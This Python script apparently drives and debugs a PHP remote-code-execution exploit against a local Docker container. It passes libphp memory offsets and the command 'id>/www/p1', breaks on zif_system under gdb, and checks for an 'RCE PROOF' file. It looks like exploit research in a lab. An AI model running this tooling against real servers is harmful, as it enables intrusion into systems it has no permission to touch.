import subprocess, sys, time, os, re

BASE = r"C:\Users\likat\p2s52704"
c, port = "p2s8335", "18112"
zif, dtor = "0x3ac080", "0x49ec50"

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

# Clean state
sh(f'docker exec {c} sh -c "rm -f /var/lib/php/sessions/* /www/p1 2>/dev/null"')
sh(f'docker restart {c}')
time.sleep(3)

# Run exploit with P2S_PAUSE=60
env = os.environ.copy()
env["P2S_PAUSE"] = "60"
proc = subprocess.Popen(
    [sys.executable, BASE + r"\exploit.py",
     "-u", f"http://127.0.0.1:{port}/index.php",
     "--profile", "bookworm",
     "--zif-offset", zif, "--dtor-offset", dtor,
     "--htdata-offset", "0x690d8",
     "--retries", "1",
     "-c", "id>/www/p1", "--fetch", "/www/p1"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    text=True, env=env, bufsize=1
)

# Read until PAUSE
pause_hit = False
for line in proc.stdout:
    print(line, end="", flush=True)
    if "PAUSE" in line:
        pause_hit = True
        break

if not pause_hit:
    proc.wait()
    sys.exit(1)

print("\n[*] PAUSE hit - setting up gdb in container...", flush=True)
time.sleep(1)

# Get worker PID inside container
r = sh(f'docker exec {c} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
worker_pid = pids[-1] if pids else None
print(f"[*] worker PID: {worker_pid}", flush=True)

# Find libphp base from /proc
r = sh(f'docker exec {c} sh -c "grep libphp /proc/{worker_pid}/maps 2>/dev/null | head -1"')
maps_line = r.stdout.strip()
if not maps_line:
    print("[!] could not find libphp in maps", flush=True)
    proc.kill()
    sys.exit(1)

base_hex = maps_line.split("-")[0]
maps_base = int(base_hex, 16)
zif_addr = maps_base + 0x3ac080
print(f"[*] libphp base: {hex(maps_base)}", flush=True)
print(f"[*] zif_system:  {hex(zif_addr)}", flush=True)

# Write gdb script locally, then docker cp
gdb_script = (
    "set pagination off\n"
    "set confirm off\n"
    "set width 0\n"
    f"break *{hex(zif_addr)}\n"
    "commands\n"
    "  silent\n"
    "  echo ===== ZIF_SYSTEM CALLED =====\\n\n"
    "  bt 15\n"
    "  info registers rdi rsi rdx rax\n"
    "  echo ===== end =====\\n\n"
    "  detach\n"
    "end\n"
    "continue\n"
)
gdb_local = os.path.join(BASE, "gdb_zif_tmp.gdb")
with open(gdb_local, "w") as f:
    f.write(gdb_script)

# Copy gdb script into container
sh(f'docker cp "{gdb_local}" {c}:/tmp/gdb_zif.gdb')

# Attach gdb inside the container (timeout 55s)
print("[*] attaching gdb...", flush=True)
gdb_proc = subprocess.Popen(
    f'docker exec {c} timeout 55 gdb -batch -x /tmp/gdb_zif.gdb -p {worker_pid}',
    shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    text=True, bufsize=1
)

time.sleep(3)
print("[*] waiting for exploit to finish...", flush=True)

try:
    out, _ = proc.communicate(timeout=120)
    tail = out[-2000:] if len(out) > 2000 else out
    print(tail, flush=True)
except subprocess.TimeoutExpired:
    proc.kill()
    out, _ = proc.communicate()
    tail = out[-2000:] if len(out) > 2000 else out
    print(tail, flush=True)

try:
    gdb_out, _ = gdb_proc.communicate(timeout=15)
    print("\n=== GDB OUTPUT ===", flush=True)
    print(gdb_out[-3000:] if len(gdb_out) > 3000 else gdb_out, flush=True)
except subprocess.TimeoutExpired:
    gdb_proc.kill()
    gdb_out, _ = gdb_proc.communicate()
    print("\n=== GDB OUTPUT (timeout) ===", flush=True)
    print(gdb_out[-3000:] if len(gdb_out) > 3000 else gdb_out, flush=True)

# Check for RCE
r = sh(f'docker exec {c} cat /www/p1 2>/dev/null')
if r.stdout.strip():
    print(f"\n[+] RCE PROOF: {r.stdout.strip()[:80]}", flush=True)
else:
    print("\n[-] no RCE proof", flush=True)
